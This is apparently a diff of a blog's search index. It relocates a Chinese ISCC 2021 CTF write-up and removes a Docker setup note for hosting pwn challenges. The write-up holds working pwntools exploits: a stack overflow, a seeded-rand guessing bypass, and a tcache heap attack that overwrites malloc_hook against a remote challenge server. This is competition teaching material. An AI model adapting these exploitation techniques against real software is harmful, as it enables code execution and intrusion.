@@ -327,49 +327,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ISCC_2021</title>
-    <url>/article/ISCC_2021/</url>
-    <content><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span>
-
-<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
-<p><img src="/article/ISCC_2021/image-20210526132438302.png" alt="image-20210526132438302"></p>
-<p>ida</p>
-<p>给了 system(“/bin/sh”)</p>
-<p><img src="/article/ISCC_2021/image-20210526132504575.png" alt="image-20210526132504575"></p>
-<p>漏洞在对 password 的检查 check 函数中</p>
-<p><img src="/article/ISCC_2021/image-20210526132549268.png" alt="image-20210526132549268"></p>
-<p>password 长度限制长度为7，然后 strcpy 到 dest，通过 s 溢出给 dest，达到栈溢出。</p>
-<p>但长度被限制了，无法直接栈溢出。</p>
-<p>想到程序是32bit，strlen函数指取寄存器的低位，而 strcpy函数是直到 ‘\x00’ 才停止。</p>
-<p>我们发送的payload是0x107位就能使得strlen==7。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./M78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call_main = <span class="number">0x08049202</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please choose a building&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_main)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the password&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>保护</p>
-<p><img src="/article/ISCC_2021/image-20210526180142223.png" alt="image-20210526180142223"></p>
-<p>ida</p>
-<p><img src="/article/ISCC_2021/image-20210526180156262.png" alt="image-20210526180156262"></p>
-<p><img src="/article/ISCC_2021/image-20210526180206793.png" alt="image-20210526180206793"></p>
-<p>c语言写程序跑一遍</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        srand(a);</span><br><span class="line">        b = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,b); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/ISCC_2021/image-20210526182640652.png" alt="image-20210526182640652"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">55</span>,<span class="number">15</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">68</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">86</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your name is :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Guess Number:&#x27;</span>,<span class="built_in">str</span>(s[i]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="box"><a href="#box" class="headerlink" title="box"></a>box</h2><p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>,<span class="number">7020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,length,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input data:&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook = main - <span class="number">0x10</span></span><br><span class="line">libc = main - <span class="number">0x3ebc40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0</span>) + p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc+<span class="number">0x10a38c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the index:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
     <title>HGame</title>
     <url>/article/HGame/</url>
     <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><span id="more"></span>
@@ -446,6 +403,49 @@
 
 
 
+
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ISCC_2021</title>
+    <url>/article/ISCC_2021/</url>
+    <content><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span>
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
+<p><img src="/article/ISCC_2021/image-20210526132438302.png" alt="image-20210526132438302"></p>
+<p>ida</p>
+<p>给了 system(“/bin/sh”)</p>
+<p><img src="/article/ISCC_2021/image-20210526132504575.png" alt="image-20210526132504575"></p>
+<p>漏洞在对 password 的检查 check 函数中</p>
+<p><img src="/article/ISCC_2021/image-20210526132549268.png" alt="image-20210526132549268"></p>
+<p>password 长度限制长度为7，然后 strcpy 到 dest，通过 s 溢出给 dest，达到栈溢出。</p>
+<p>但长度被限制了，无法直接栈溢出。</p>
+<p>想到程序是32bit，strlen函数指取寄存器的低位，而 strcpy函数是直到 ‘\x00’ 才停止。</p>
+<p>我们发送的payload是0x107位就能使得strlen==7。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./M78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call_main = <span class="number">0x08049202</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please choose a building&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_main)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the password&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>保护</p>
+<p><img src="/article/ISCC_2021/image-20210526180142223.png" alt="image-20210526180142223"></p>
+<p>ida</p>
+<p><img src="/article/ISCC_2021/image-20210526180156262.png" alt="image-20210526180156262"></p>
+<p><img src="/article/ISCC_2021/image-20210526180206793.png" alt="image-20210526180206793"></p>
+<p>c语言写程序跑一遍</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        srand(a);</span><br><span class="line">        b = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,b); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ISCC_2021/image-20210526182640652.png" alt="image-20210526182640652"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">55</span>,<span class="number">15</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">68</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">86</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your name is :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Guess Number:&#x27;</span>,<span class="built_in">str</span>(s[i]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="box"><a href="#box" class="headerlink" title="box"></a>box</h2><p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>,<span class="number">7020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,length,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input data:&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook = main - <span class="number">0x10</span></span><br><span class="line">libc = main - <span class="number">0x3ebc40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0</span>) + p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc+<span class="number">0x10a38c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the index:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -547,48 +547,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Pwn(ubuntu_docker)</title>
-    <url>/article/Pwn_ubuntu_docker/</url>
-    <content><![CDATA[<h2 id="一、Docker-安装"><a href="#一、Docker-安装" class="headerlink" title="一、Docker 安装"></a>一、Docker 安装</h2><h3 id="1-使用官方安装脚本自动安装"><a href="#1-使用官方安装脚本自动安装" class="headerlink" title="1.使用官方安装脚本自动安装"></a>1.使用官方安装脚本自动安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
-
-<p>也可以使用国内 daocloud 一键安装命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
-
-<p>apt安装docker-compose：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install docker docker-compose -y</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-切换镜像源"><a href="#2-切换镜像源" class="headerlink" title="2.切换镜像源"></a>2.切换镜像源</h3><p><code>vim /etc/docker/daemon.json</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure>
-
-<h2 id="二、Docker-简单使用"><a href="#二、Docker-简单使用" class="headerlink" title="二、Docker 简单使用"></a>二、Docker 简单使用</h2><p>我们可以通过以下几条命令简单测试一下docker是否安装成功：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">service docker start</span><br><span class="line">docker images</span><br><span class="line"><span class="comment">#hello-world为其自带的一个image</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
-
-<p>常用指令：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line"><span class="comment">#查看镜像</span></span><br><span class="line">docker run -d [images_name/<span class="built_in">id</span>] /<span class="built_in">bin</span>/bash</span><br><span class="line"><span class="comment">#run：运行 镜像 从而生成 容器; -d：后台运行容器; [images_name/id]：换成镜像的id或者名称; /bin/bash：运行镜像的权限</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment">#查看在运行的容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment">#查看所有容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it [container-<span class="built_in">id</span>] /<span class="built_in">bin</span>/bash</span><br><span class="line"><span class="comment">#进入容器; exec:在运行的容器中执行命令; -i:互交界面, -t:分配一个伪终端; container-id:换成容器id</span></span><br><span class="line">docker rm [container-<span class="built_in">id</span>]</span><br><span class="line"><span class="comment">#删除容器</span></span><br><span class="line">docker rmi [images-name]</span><br><span class="line"><span class="comment">#删除镜像</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="三、ctf-xinetd下载与使用"><a href="#三、ctf-xinetd下载与使用" class="headerlink" title="三、ctf_xinetd下载与使用"></a>三、ctf_xinetd下载与使用</h2><p>从GitHub上下载<a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a></p>
-<h3 id="1-放题目"><a href="#1-放题目" class="headerlink" title="1.放题目"></a>1.放题目</h3><p>把题目可执行文件和flag放在ctf_xinetd/bin中<br>ps：不要把 bin 作为题目的名字</p>
-<p><img src="https://img-blog.csdnimg.cn/20201103210513145.png#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="2-修改ctf-xinetd文件"><a href="#2-修改ctf-xinetd文件" class="headerlink" title="2.修改ctf.xinetd文件"></a>2.修改ctf.xinetd文件</h3><p>回到ctf_xinetd目录下，修改ctf.xinetd<br>把图片箭头指向的 <code>helloworld</code> 改成bin文件夹中题目的名字<br>保存退出</p>
-<p><img src="https://img-blog.csdnimg.cn/20201103210745998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="3-Build"><a href="#3-Build" class="headerlink" title="3.Build"></a>3.Build</h3><p>在ctf_xinetd目录下 <code>docker build -t &quot;pwn&quot; .</code></p>
-<h3 id="4-Run"><a href="#4-Run" class="headerlink" title="4.Run"></a>4.Run</h3><p>在ctf_xinetd目录下 <code>docker run -d -p &quot;0.0.0.0:pub_port:9999&quot; -h &quot;pwn&quot; --name=&quot;pwn&quot; pwn</code><br>-h：指定容器的hostname<br>pub_port：改成你想放置的端口号，建议如8001，8002…等<br>pub_port is the port you want to expose to the public network.</p>
-<p>此时输入docker ps 会发现题目容器已经启动了，可以nc 0.0.0.0 pub_port进行测试一下（pub_port：改成你想放置的端口号）</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.runoob.com/docker/ubuntu-docker-install.html">docker | 菜鸟教程</a></p>
-<p><a href="https://blog.csdn.net/qq_40173126/article/details/83552307?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-3-83552307.nonecase&utm_term=pwn%E5%87%BA%E9%A2%98%E6%BA%90%E4%BB%A3%E7%A0%81&spm=1000.2123.3001.4430">使用Docker进行Pwn题环境部署</a></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>ubuntu</tag>
-        <tag>题目环境</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pwn_0xGame_01</title>
     <url>/article/Pwn_0xGame_01/</url>
     <content><![CDATA[<h1 id="Pwn-0xGame-01"><a href="#Pwn-0xGame-01" class="headerlink" title="Pwn_0xGame_01"></a>Pwn_0xGame_01</h1><span id="more"></span>
@@ -670,6 +628,48 @@
